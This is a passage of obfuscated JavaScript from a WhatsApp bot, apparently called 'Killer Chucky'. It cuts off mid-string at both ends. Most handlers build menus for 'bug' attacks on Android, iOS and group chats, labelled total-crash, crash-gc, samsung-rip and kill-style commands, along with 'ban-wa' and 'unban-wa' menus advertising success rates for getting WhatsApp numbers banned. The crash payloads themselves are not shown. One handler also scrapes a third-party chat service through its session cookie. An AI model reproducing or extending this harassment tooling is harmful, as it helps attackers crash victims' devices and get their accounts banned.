                      buttonParamsJson: "{ \"title\": \"𝙼𝙴𝙽𝚄\", \"sections\": [{ \"title\": \"𝘊𝘏𝘜𝘊𝘒𝘠 𝘝6 𝘋𝘌𝘝𝘌𝘓𝘖𝘗𝘌𝘋 𝘉𝘠 𝘔𝘈𝘙𝘟\", \"highlight_label\": \"👑Powered By " + global.namaown + "\", \"rows\": [{ \"header\": \"𖥂 𝐄𝐌𝐎𝐉𝐈 𝐁𝐔𝐆𝐒 \", \"title\": \"🅳🅸🆂🅿🅻🅰🆈 🅴🅼🅾🅹🅸 🅱🆄🅶🅼🅴🅽🆄\", \"id\": \".emojibug\" }, \n{ \"header\": \"𖥂 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒 \", \"title\": \"🅳🅸🆂🅿🅻🅰🆈 🅰🅽🅳🆁🅾🅸🅳 🅱🆄🅶🅼🅴🅽🆄\", \"id\": \".andro\"},\n{ \"header\": \"𖥂 𝐈𝐎𝐒 𝐁𝐔𝐆𝐒 \", \"title\": \"🅳🅸🆂🅿🅻🅰🆈 🅸🅾🆂 🅱🆄🅶🅼🅴🅽🆄 \", \"id\": \".iosmenux\"},\n{ \"header\": \"𖥂 𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆𝐒 \", \"title\": \"🅳🅸🆂🅿🅻🅰🆈 🅶🆁🅾🆄🅿 🅱🆄🅶🅼🅴🅽🆄 \", \"id\": \".buginplace\"},\n{ \"header\": \"𖥂 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐁𝐔𝐆𝐒 \", \"title\": \"🅳🅸🆂🅿🅻🅰🆈 🅿🆁🅴🅼🅸🆄🅼 🅱🆄🅶🅼🅴🅽🆄\", \"id\": \".vipbug\"},\n{ \"header\": \"𖥂 𝐖𝐀 𝐁𝐀𝐍𝐍𝐄𝐑 \", \"title\": \"🅳🅸🆂🅿🅻🅰🆈 🅲🅷🆄🅲🅺🆈 🅱🅰🅽🅽🅴🆁 🅼🅴🅽🆄\", \"id\": \". chuckybanner\"},\n{ \"header\": \"𖥂 𝐖𝐀 𝐔𝐍𝐁𝐀𝐍𝐍𝐄𝐑 \", \"title\": \"🅳🅸🆂🅿🅻🅰🆈 🅲🅷🆄🅲🅺🆈 🆄🅽🅱🅰🅽🅽🅴🆁 🅼🅴🅽🆄 \", \"id\": \".chuckyunbanner\" }]}]}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Repo\",\"url\":\"" + global.url + "\",\"merchant_url\":\"" + global.url + "\"}"
                    }, {
                      name: "quick_reply",
                      buttonParamsJson: "{\"display_text\":\"Owner Bot\",\"title\":\"Marx Bot Inc\",\"id\":\".owner\"}"
                    }]
                  }),
                  messageParamsJson: ""
                }
              }
            }
          }, _0x5b1576);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x292011.message, {
            messageId: _0x292011.key.id
          });
        }
        break;
      case "piffng":
        let _0x4c10b1 = Date.now();
        _0x3b9923("Pinging...");
        let _0x1209fb = Date.now();
        let _0x58a5ed = ((_0x1209fb - _0x4c10b1) / 2 / 1000).toFixed(4);
        _0x3b9923("Pong! 🏓 Response time: " + _0x58a5ed + "ms");
        break;
      case "marxngl":
        {
          const _0x3ad28a = "https://ngl.link/marxalone";
          await _0x3b9923("Here is your link: " + _0x3ad28a);
          break;
        }
      case "chuckybanner":
        {
          await _0x34c772();
          const _0x2048fe = {
            image: _0x34a350
          };
          const _0x1484a1 = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x1aa816 = await prepareWAMessageMedia(_0x2048fe, _0x1484a1);
          let _0x4cae82 = "\n┏━━━━━━━━━━━━━━━━━━━┓\n┃𖥂 *" + _0x214fac + "* *\n┃             `" + _0x45dcac + "`\n┃━━━━━━━━━━━━━━━━━━━\n┃ 𖥂 `𝐓𝐈𝐌𝐄` : *" + _0x461573 + "*\n┃ 𖥂 `𝐃𝐀𝐓𝐄` : *" + _0x461a13 + "*\n┃ 𖥂 `𝐁𝐎𝐓` : " + global.namabot + "\n┃ 𖥂 `𝐕𝐄𝐑𝐒𝐈𝐎𝐍` : " + global.versisc + "\n┃ 𖥂 `𝐎𝐖𝐍𝐄𝐑` : " + global.namaown + "\n┗━━━━━━━━━━━━━━━━━━━┛\n";
          const _0x18500c = {
            ..._0x1aa816
          };
          _0x18500c.hasMediaAttachment = false;
          const _0xc5319d = {
            text: _0x4cae82
          };
          const _0x58ee15 = {
            quoted: _0xea19ed
          };
          const _0x1cf92a = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: _0x18500c,
                  body: _0xc5319d,
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: "{ \"title\": \"𝐂𝐇𝐔𝐂𝐊𝐘 𝐖𝐀 𝐁𝐀𝐍𝐍𝐄𝐑\", \"sections\": [{ \"title\": \"𝟖𝟎% 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐑𝐀𝐓𝐄🔥\", \"highlight_label\": \"👑Powered By " + global.namaown + "\", \"rows\": [{ \"header\": \"𖥂 ʙᴀɴ-ᴡᴀ 1\", \"title\": \"𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖚𝖈𝖐𝖞 𝖇𝖆𝖓𝖓𝖊𝖗\", \"id\": \".ban-wa1\" }, \n{ \"header\": \"𖥂 ʙᴀɴ-ᴡᴀ 2\", \"title\": \"𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖚𝖈𝖐𝖞 𝖇𝖆𝖓𝖓𝖊𝖗\", \"id\": \".ban-wa2\"},\n{ \"header\": \"𖥂 ʙᴀɴ-ᴡᴀ 3 \", \"title\": \"𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖚𝖈𝖐𝖞 𝖇𝖆𝖓𝖓𝖊𝖗\", \"id\": \".ban-wa3\"},\n{ \"header\": \"𖥂 ʙᴀɴ-ᴡᴀ 4 \", \"title\": \"𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖚𝖈𝖐𝖞 𝖇𝖆𝖓𝖓𝖊𝖗\", \"id\": \".ban-wa4\"},\n{ \"header\": \"𖥂 ʙᴀɴ-ᴡᴀ 5 \", \"title\": \"𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖚𝖈𝖐𝖞 𝖇𝖆𝖓𝖓𝖊𝖗\", \"id\": \".ban-wa5\" }]}]}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Repo\",\"url\":\"" + global.url + "\",\"merchant_url\":\"" + global.url + "\"}"
                    }, {
                      name: "quick_reply",
                      buttonParamsJson: "{\"display_text\":\"Owner Bot\",\"title\":\"Marx Bot Inc\",\"id\":\".owner\"}"
                    }]
                  }),
                  messageParamsJson: ""
                }
              }
            }
          }, _0x58ee15);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x1cf92a.message, {
            messageId: _0x1cf92a.key.id
          });
        }
        break;
      case "chuckyunbanner":
        {
          await _0x34c772();
          const _0xc95052 = {
            image: _0x34a350
          };
          const _0x364766 = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x52f490 = await prepareWAMessageMedia(_0xc95052, _0x364766);
          let _0x28503a = "\n┏━━━━━━━━━━━━━━━━━━━┓\n┃𖥂 *" + _0x214fac + "* *\n┃             `" + _0x45dcac + "`\n┃━━━━━━━━━━━━━━━━━━━\n┃ 𖥂 `𝐓𝐈𝐌𝐄` : *" + _0x461573 + "*\n┃ 𖥂 `𝐃𝐀𝐓𝐄` : *" + _0x461a13 + "*\n┃ 𖥂 `𝐁𝐎𝐓` : " + global.namabot + "\n┃ 𖥂 `𝐕𝐄𝐑𝐒𝐈𝐎𝐍` : " + global.versisc + "\n┃ 𖥂 `𝐎𝐖𝐍𝐄𝐑` : " + global.namaown + "\n┗━━━━━━━━━━━━━━━━━━━┛\n";
          const _0x41de32 = {
            ..._0x52f490
          };
          _0x41de32.hasMediaAttachment = false;
          const _0x2be30a = {
            text: _0x28503a
          };
          const _0x4150fd = {
            quoted: _0xea19ed
          };
          const _0x24cbc7 = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: _0x41de32,
                  body: _0x2be30a,
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: "{ \"title\": \"𝐂𝐇𝐔𝐂𝐊𝐘 𝐖𝐀 𝐔𝐍𝐁𝐀𝐍𝐍𝐄𝐑\", \"sections\": [{ \"title\": \"𝟗𝟓% 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐑𝐀𝐓𝐄🔥\", \"highlight_label\": \"👑Powered By " + global.namaown + "\", \"rows\": [{ \"header\": \"𖥂 ᴜɴʙᴀɴ-ᴡᴀ 1\", \"title\": \"𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖚𝖈𝖐𝖞 𝖚𝖓𝖇𝖆𝖓𝖓𝖊𝖗\", \"id\": \".unban-wa1\" }, \n{ \"header\": \"𖥂 ᴜɴʙᴀɴ-ᴡᴀ 2\", \"title\": \"𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖚𝖈𝖐𝖞 𝖚𝖓𝖇𝖆𝖓𝖓𝖊𝖗\", \"id\": \".unban-wa2\"},\n{ \"header\": \"𖥂 ᴜɴʙᴀɴ-ᴡᴀ 3 \", \"title\": \"𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖚𝖈𝖐𝖞 𝖚𝖓𝖇𝖆𝖓𝖓𝖊𝖗\", \"id\": \".unban-wa3\"},\n{ \"header\": \"𖥂 ᴜɴʙᴀɴ-ᴡᴀ 4 \", \"title\": \"𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖚𝖈𝖐𝖞 𝖚𝖓𝖇𝖆𝖓𝖓𝖊𝖗\", \"id\": \".unban-wa4\"},\n{ \"header\": \"𖥂 ᴜɴʙᴀɴ-ᴡᴀ 5 \", \"title\": \"𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖚𝖈𝖐𝖞 𝖚𝖓𝖇𝖆𝖓𝖓𝖊𝖗\", \"id\": \".unban-wa5\" }]}]}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Repo\",\"url\":\"" + global.url + "\",\"merchant_url\":\"" + global.url + "\"}"
                    }, {
                      name: "quick_reply",
                      buttonParamsJson: "{\"display_text\":\"Owner Bot\",\"title\":\"Marx Bot Inc\",\"id\":\".owner\"}"
                    }]
                  }),
                  messageParamsJson: ""
                }
              }
            }
          }, _0x4150fd);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x24cbc7.message, {
            messageId: _0x24cbc7.key.id
          });
        }
        break;
      case "botinfoo":
        {
          let _0x31f179 = [_0x34a350, _0x1fa4e2];
          let _0x4c1efe = Math.floor(Math.random() * _0x31f179.length);
          let _0x53e74b = _0x31f179[_0x4c1efe];
          let _0x26956e = "\n━━━━━━━━━━━━━━━━\n𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n━━━━━━━━━━━━━━━━\nWAGWAN " + _0x21f0d9.pushName + "\n┗━━━━━━━━━━━━━━━━\n┃ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : " + _0x26fa88(process.uptime()) + "\n┗━━━━━━━━━━━━━━━━\n" + global.line + " BOT NAME : " + global.namabot + "\n" + global.end + "\n" + global.line + " BOT MODEL : Chucky-V748E\n" + global.end + "\n" + global.line + " BOT VERSION :7\n" + global.end + "\n" + global.line + " Build number : V748E-CH64KL\n" + global.end + "\n> " + global.namaown + " \n" + global.end + "\n";
          const _0x53363f = {
            text: _0x26956e
          };
          let _0x1a1233 = {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: _0xda26e2.Message.InteractiveMessage.fromObject({
                  body: _0xda26e2.Message.InteractiveMessage.Body.fromObject(_0x53363f),
                  nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "MAIN MENU",
                        sections: [{
                          title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘",
                          highlight_label: "A NEW ERA",
                          rows: [{
                            header: "OWNER MENU",
                            title: "Display Ownermenu",
                            id: "ownermenu"
                          }, {
                            header: "BUG MENU",
                            title: "Display Bugmenu",
                            id: "bugmenu"
                          }, {
                            header: "Chucky Test 3",
                            title: "Menu 3",
                            id: "botinfo"
                          }, {
                            header: "Chucky Test 4",
                            title: "Menu 4",
                            id: "menu_4"
                          }, {
                            header: "Chucky Test 5",
                            title: "Menu 5",
                            id: "menu_5"
                          }]
                        }]
                      })
                    }]
                  })
                })
              }
            }
          };
          const _0x3adca5 = {
            title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
            body: "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌",
            thumbnail: _0x53e74b,
            mediaType: 4,
            MediaUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s",
            sourceUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s"
          };
          const _0x2d2bf3 = {
            externalAdReply: _0x3adca5
          };
          const _0x5e767d = {
            image: _0x34a350,
            caption: _0x26956e,
            contextInfo: _0x2d2bf3
          };
          let _0x30e43b = _0x5e767d;
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x1a1233, {
            quoted: _0x21f0d9
          });
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x30e43b, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "mainmenu":
        {
          await _0x34c772();
          const _0x32bdee = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x2344eb = await prepareWAMessageMedia({
            image: _0x4d1a4f.readFileSync("./marx/anjay.jpg")
          }, _0x32bdee);
          const _0x14a304 = {
            text: "Wagan " + _0x45dcac
          };
          const _0x570ae2 = {
            hasMediaAttachment: true,
            ..._0x2344eb
          };
          const _0x88e649 = {
            quoted: _0xea19ed
          };
          const _0x2522f2 = await _0x770315(_0x21f0d9.chat, {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: _0xda26e2.Message.InteractiveMessage.fromObject({
                  body: _0xda26e2.Message.InteractiveMessage.Body.fromObject(_0x14a304),
                  carouselMessage: _0xda26e2.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: [{
                      header: _0xda26e2.Message.InteractiveMessage.Header.fromObject(_0x570ae2),
                      nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "MAIN MENU",
                            sections: [{
                              title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘",
                              highlight_label: "A NEW ERA",
                              rows: [{
                                header: "OWNER MENU",
                                title: "Display Ownermenu",
                                id: "ownermenu"
                              }, {
                                header: "BUG MENU",
                                title: "Display Bugmenu",
                                id: "bugmenu"
                              }, {
                                header: "NFWS MENU",
                                title: "display nfws menu",
                                id: "botinfo"
                              }, {
                                header: "chucky test 4",
                                title: "Menu 4",
                                id: "menu_4"
                              }, {
                                header: "chucky test 5",
                                title: "Menu 5",
                                id: "menu_5"
                              }]
                            }]
                          })
                        }]
                      })
                    }]
                  })
                })
              }
            }
          }, _0x88e649);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x2522f2.message, {
            messageId: _0x2522f2.key.id
          });
        }
        break;
      case "marxai":
        {
          if (!q) {
            return _0x3b9923("Marx-ai here🤭 How can i help you");
          }
          async function _0x126de4() {
            const _0x5ebd44 = await axios.get("https://editee.com/chat-gpt");
            if (_0x5ebd44.headers["set-cookie"]) {
              return _0x5ebd44.headers["set-cookie"][0].split(";")[0].split("=")[1];
            } else {
              return null;
            }
          }
          async function _0x32a879(_0xf199c) {
            const _0x10a30b = await _0x126de4();
            const _0x2d5dc0 = {
              "content-type": "application/json",
              cookie: "editeecom_session=" + _0x10a30b,
              "user-agent": "Mozilla/5.0",
              "x-requested-with": "XMLHttpRequest"
            };
            const _0x5dca9c = _0x2d5dc0;
            const _0x3547a5 = {
              headers: _0x5dca9c
            };
            const _0x4b8541 = await axios.post("https://editee.com/submit/chatgptfree", {
              context: " ",
              selected_model: "gemini",
              important: "aV77OsKy",
              user_input: _0xf199c
            }, _0x3547a5);
            return _0x4b8541.data;
          }
          try {
            const _0x8f5cfb = await _0x32a879(q);
            await _0x3b9923(_0x8f5cfb.text);
          } catch (_0x32b9f5) {
            console.error("Error:", _0x32b9f5);
            await _0x3b9923("Terjadi ?.");
          }
          break;
        }
      case "vipbug":
        {
          await _0x34c772();
          const _0x43a4c5 = {
            image: _0x34a350
          };
          const _0x2c294c = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x516f96 = await prepareWAMessageMedia(_0x43a4c5, _0x2c294c);
          let _0x21d0e4 = "\n┏━━━━━━━━━━━━━━━━━━━┓\n┃𖥂 *" + _0x214fac + "* *\n┃             `" + _0x45dcac + "`\n┃━━━━━━━━━━━━━━━━━━━\n┃ 𖥂 `𝐓𝐈𝐌𝐄` : *" + _0x461573 + "*\n┃ 𖥂 `𝐃𝐀𝐓𝐄` : *" + _0x461a13 + "*\n┃ 𖥂 `𝐁𝐎𝐓` : " + global.namabot + "\n┃ 𖥂 `𝐕𝐄𝐑𝐒𝐈𝐎𝐍` : " + global.versisc + "\n┃ 𖥂 `𝐎𝐖𝐍𝐄𝐑` : " + global.namaown + "\n┗━━━━━━━━━━━━━━━━━━━┛\n┏━━━━━━━━━━━━━━━━━━━┓   \n┃ " + global.simbol + " ᴛᴏᴛᴀʟ-ᴄʀᴀsʜ\n┃ " + global.simbol + " sʏs-ᴄʀᴀsʜ\n┃ " + global.simbol + " sᴀᴍsᴜɴɢ-ʀɪᴘ\n┃ " + global.simbol + " ᴏʙʟɪᴛᴇʀᴀᴛᴇ\n┃ " + global.simbol + " ᴇxᴛɪɴᴄᴛ\n┃ " + global.simbol + " ᴠᴀᴘᴏʀɪᴢᴇ\n┃ " + global.simbol + " ᴏғғ\n┃ " + global.simbol + " ʙᴏᴍʙ\n┃ " + global.simbol + " ᴄʟᴀɴ-ᴡᴀʀ\n┃ " + global.simbol + " ᴄʟᴀɴ-ʙᴜɢ\n┗━━━━━━━━━━━━━━━━━━━┛";
          const _0x54d239 = {
            ..._0x516f96
          };
          _0x54d239.hasMediaAttachment = false;
          const _0x1993d4 = {
            text: _0x21d0e4
          };
          const _0x58dfc2 = {
            quoted: _0xea19ed
          };
          const _0x5c9eea = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: _0x54d239,
                  body: _0x1993d4,
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\ndisplay_text: '𝙈𝙖𝙧𝙭 𝘽𝙤𝙩 𝙄𝙣𝙘',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    messageParamsJson: ""
                  }
                }
              }
            }
          }, _0x58dfc2);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x5c9eea.message, {
            messageId: _0x5c9eea.key.id
          });
        }
        break;
      case "buginplace":
        {
          await _0x34c772();
          const _0x43559b = {
            image: _0x34a350
          };
          const _0x283a56 = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x10328e = await prepareWAMessageMedia(_0x43559b, _0x283a56);
          let _0x30752b = "\n┏━━━━━━━━━━━━━━━━━━━┓\n┃𖥂 *" + _0x214fac + "* *\n┃             `" + _0x45dcac + "`\n┃━━━━━━━━━━━━━━━━━━━\n┃ 𖥂 `𝐓𝐈𝐌𝐄` : *" + _0x461573 + "*\n┃ 𖥂 `𝐃𝐀𝐓𝐄` : *" + _0x461a13 + "*\n┃ 𖥂 `𝐁𝐎𝐓` : " + global.namabot + "\n┃ 𖥂 `𝐕𝐄𝐑𝐒𝐈𝐎𝐍` : " + global.versisc + "\n┃ 𖥂 `𝐎𝐖𝐍𝐄𝐑` : " + global.namaown + "\n┗━━━━━━━━━━━━━━━━━━━┛\n┏━━━━━━━━━━━━━━━━━━━┓\n┃ " + global.simbol + " ᴄʟᴏsᴇ-ɢᴄ\n┃ " + global.simbol + " ғᴜᴄᴋ-ɢᴄ\n┃ " + global.simbol + " ᴋɪᴄᴋ-ɢᴄ\n┃ " + global.simbol + " ᴄʀᴀsʜ-ɢᴄ\n┃ " + global.simbol + " ᴅᴇᴍᴏɴ\n┃ " + global.simbol + " ʙᴜɢ-ᴄʜᴀᴛ\n┃ " + global.simbol + " ғʀᴇᴢ-ɢᴄ\n┃ " + global.simbol + " ᴄʜᴜᴄᴋʏ-ɢᴄ\n┗━━━━━━━━━━━━━━━━━━━┛";
          const _0x147120 = {
            ..._0x10328e
          };
          _0x147120.hasMediaAttachment = false;
          const _0x40fa84 = {
            text: _0x30752b
          };
          const _0x1a6240 = {
            quoted: _0xea19ed
          };
          const _0x21ea43 = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: _0x147120,
                  body: _0x40fa84,
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\ndisplay_text: '𝙈𝙖𝙧𝙭 𝘽𝙤𝙩 𝙄𝙣𝙘',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    messageParamsJson: ""
                  }
                }
              }
            }
          }, _0x1a6240);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x21ea43.message, {
            messageId: _0x21ea43.key.id
          });
        }
        break;
      case "brat":
        {
          const {
            createCanvas: _0xdee166,
            registerFont: _0x47aca3
          } = require("canvas");
          const _0x5860ef = require("jimp");
          async function _0x4b87da(_0xb960d4) {
            let _0x1c74eb = 512;
            let _0x25ae42 = 512;
            let _0x43b6e0 = 20;
            let _0x31734a = 50;
            let _0x45f342 = _0xdee166(_0x1c74eb, _0x25ae42);
            let _0x329296 = _0x45f342.getContext("2d");
            _0x329296.fillStyle = "white";
            _0x329296.fillRect(0, 0, _0x1c74eb, _0x25ae42);
            let _0x5f2b94 = 280;
            let _0x3d12b9 = 1.3;
            _0x329296.textAlign = "left";
            _0x329296.textBaseline = "top";
            _0x329296.fillStyle = "black";
            _0x47aca3("./lib/arialnarrow.ttf", {
              family: "Narrow"
            });
            let _0xc294be = _0xb960d4.split(" ");
            let _0x25d247 = [];
            let _0x542766 = () => {
              _0x25d247 = [];
              let _0x271f89 = "";
              for (let _0xa74adf of _0xc294be) {
                let _0x5634f1 = _0x271f89 ? _0x271f89 + " " + _0xa74adf : _0xa74adf;
                let _0x280105 = _0x329296.measureText(_0x5634f1).width + (_0x271f89.split(" ").length - 1) * _0x31734a;
                if (_0x280105 < _0x1c74eb - _0x43b6e0 * 2) {
                  _0x271f89 = _0x5634f1;
                } else {
                  _0x25d247.push(_0x271f89);
                  _0x271f89 = _0xa74adf;
                }
              }
              if (_0x271f89) {
                _0x25d247.push(_0x271f89);
              }
            };
            _0x329296.font = _0x5f2b94 + "px Narrow";
            _0x542766();
            while (_0x25d247.length * _0x5f2b94 * _0x3d12b9 > _0x25ae42 - _0x43b6e0 * 2) {
              _0x5f2b94 -= 2;
              _0x329296.font = _0x5f2b94 + "px Narrow";
              _0x542766();
            }
            let _0x490204 = _0x5f2b94 * _0x3d12b9;
            let _0x3dd7e8 = _0x43b6e0;
            for (let _0x8db88e of _0x25d247) {
              let _0x189371 = _0x8db88e.split(" ");
              let _0x3aff22 = _0x43b6e0;
              for (let _0x3ca25c of _0x189371) {
                _0x329296.fillText(_0x3ca25c, _0x3aff22, _0x3dd7e8);
                _0x3aff22 += _0x329296.measureText(_0x3ca25c).width + _0x31734a;
              }
              _0x3dd7e8 += _0x490204;
            }
            let _0x248f27 = _0x45f342.toBuffer("image/png");
            let _0xe8bc01 = await _0x5860ef.read(_0x248f27);
            _0xe8bc01.blur(3);
            let _0x507dea = await _0xe8bc01.getBufferAsync(_0x5860ef.MIME_PNG);
            return _0x4b53e5.imgToSticker(_0x21f0d9.chat, _0x507dea, _0x21f0d9, {
              packname: "Chucky",
              author: "Marx King"
            });
          }
          if (!_0x40d288) {
            return _0x3b9923("Enter text for the sticker.\n\nExample:\n.brat Atmin Handsome");
          }
          return _0x4b87da(_0x40d288);
        }
        break;
      case "emobbvvjibug":
        {
          await _0x34c772();
          const _0x32b2bc = {
            image: _0x34a350
          };
          const _0x4e6ec0 = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x33c063 = await prepareWAMessageMedia(_0x32b2bc, _0x4e6ec0);
          let _0xbced6b = "\n┏━━━━━━━━━━━━━━━━━━━┓\n┃𖥂 *" + _0x214fac + "* *\n┃             `" + _0x45dcac + "`\n┃━━━━━━━━━━━━━━━━━━━\n┃ 𖥂 `𝐓𝐈𝐌𝐄` : *" + _0x461573 + "*\n┃ 𖥂 `𝐃𝐀𝐓𝐄` : *" + _0x461a13 + "*\n┃ 𖥂 `𝐁𝐎𝐓` : " + global.namabot + "\n┃ 𖥂 `𝐕𝐄𝐑𝐒𝐈𝐎𝐍` : " + global.versisc + "\n┃ 𖥂 `𝐎𝐖𝐍𝐄𝐑` : " + global.namaown + "\n┗━━━━━━━━━━━━━━━━━━━┛\n┏━━━━━━━━━━━━━━━━━━━┓\n┃ " + global.simbol + "  😜\n┃ " + global.simbol + "  🐷\n┃ " + global.simbol + "  😡\n┃ " + global.simbol + "  👊\n┃ " + global.simbol + "  🤡\n┃ " + global.simbol + "  🤙\n┃ " + global.simbol + "  🗿\n┃ " + global.simbol + "  😑\n┃ " + global.simbol + "  🔪\n┃ " + global.simbol + "  😍\n┃ " + global.simbol + "  👍\n┃ " + global.simbol + "  🤣\n┃ " + global.simbol + "  🌹\n┃ " + global.simbol + "  🤫\n┗━━━━━━━━━━━━━━━━━━┛";
          const _0x4e11ce = {
            ..._0x33c063
          };
          _0x4e11ce.hasMediaAttachment = false;
          const _0x355d67 = {
            text: _0xbced6b
          };
          const _0x39b05b = {
            quoted: _0xea19ed
          };
          const _0xe07b86 = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: _0x4e11ce,
                  body: _0x355d67,
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\ndisplay_text: '𝙈𝙖𝙧𝙭 𝘽𝙤𝙩 𝙄𝙣𝙘',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    messageParamsJson: ""
                  }
                }
              }
            }
          }, _0x39b05b);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0xe07b86.message, {
            messageId: _0xe07b86.key.id
          });
        }
        break;
      case "andro":
        {
          await _0x34c772();
          const _0x3fa3ad = {
            image: _0x34a350
          };
          const _0x4ae01b = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x224919 = await prepareWAMessageMedia(_0x3fa3ad, _0x4ae01b);
          let _0x5870a2 = "\n┏━━━━━━━━━━━━━━━━━━━┓\n┃𖥂 *" + _0x214fac + "* *\n┃             `" + _0x45dcac + "`\n┃━━━━━━━━━━━━━━━━━━━\n┃ 𖥂 `𝐓𝐈𝐌𝐄` : *" + _0x461573 + "*\n┃ 𖥂 `𝐃𝐀𝐓𝐄` : *" + _0x461a13 + "*\n┃ 𖥂 `𝐁𝐎𝐓` : " + global.namabot + "\n┃ 𖥂 `𝐕𝐄𝐑𝐒𝐈𝐎𝐍` : " + global.versisc + "\n┃ 𖥂 `𝐎𝐖𝐍𝐄𝐑` : " + global.namaown + "\n┗━━━━━━━━━━━━━━━━━━━┛  \n┏━━━━━━━━━━━━━━━━━━━┓   \n┃ " + global.simbol + " ʜɪᴛᴛ \n┃ " + global.simbol + " ᴇɴᴅ-ᴡᴀ  \n┃ " + global.simbol + " ᴋɪʟʟɪᴏs \n┃ " + global.simbol + " sʟᴀʏ\n┃ " + global.simbol + " sᴛʀɪᴋᴇ\n┃ " + global.simbol + " ᴡɪᴘᴇ-ᴏᴜᴛ \n┃ " + global.simbol + " ᴛᴀᴋᴇ-ᴅᴏᴡɴ\n┃ " + global.simbol + " ᴛᴀᴋᴇ-ᴏᴜᴛ\n┃ " + global.simbol + " ʙʟᴀsᴛ\n┃ " + global.simbol + " ᴇxɪʟᴇ\n┃ " + global.simbol + " ᴀssᴀᴜʟᴛ\n┃ " + global.simbol + " sɪʟᴇɴᴄᴇ\n┃ " + global.simbol + " ᴀssᴀssɪɴᴀᴛᴇ\n┃ " + global.simbol + " ᴄʀᴀsʜ-sʏs \n┃ " + global.simbol + " ʀᴇᴀᴘ\n┃ " + global.simbol + " 